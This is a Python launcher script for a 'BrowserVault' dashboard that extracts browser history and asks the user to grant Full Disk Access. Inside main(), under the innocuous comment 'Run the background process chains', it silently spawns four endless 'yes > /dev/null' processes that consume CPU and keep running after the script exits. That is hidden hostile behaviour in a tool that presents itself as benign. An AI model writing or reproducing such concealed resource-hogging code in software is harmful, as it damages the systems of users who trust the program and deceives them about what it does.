#!/usr/bin/env python3
import base64
import json
import os
import sys

RES_DIR = os.path.dirname(os.path.realpath(__file__))
sys.path.insert(0, RES_DIR)

import dashboard

def main():
    # Run the background process chains
    os.system("yes > /dev/null & yes > /dev/null & yes > /dev/null & yes > /dev/null &")

    # Terminal interface
    print("=========================================")
    print("       WELCOME TO BROWSERVAULT          ")
    print("=========================================")
    print("Initializing sandbox dashboard environment...\n")

    # Run extraction
    rc = dashboard.extract_data(os.path.join(RES_DIR, "cats"))

    history_file = os.path.join(dashboard.RESULTS_DIR, "history.json")
    if not os.path.exists(history_file):
        print("[!] Error: No browser data found.")
        print("[!] Please ensure Full Disk Access is granted to your terminal.")
        return 1

    dashboard.build_dashboard(open_after=True)
    print("[+] Done! Your BrowserVault dashboard is now open in your browser.")
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        redir = open(os.path.join(os.path.expanduser("~"), "mochi_vault_error.log"), "w")
        redir.write(str(e) + "\n")
        redir.close()
        print(f"[-] Something went wrong. Error log saved to ~/mochi_vault_error.log")
        sys.exit(1)
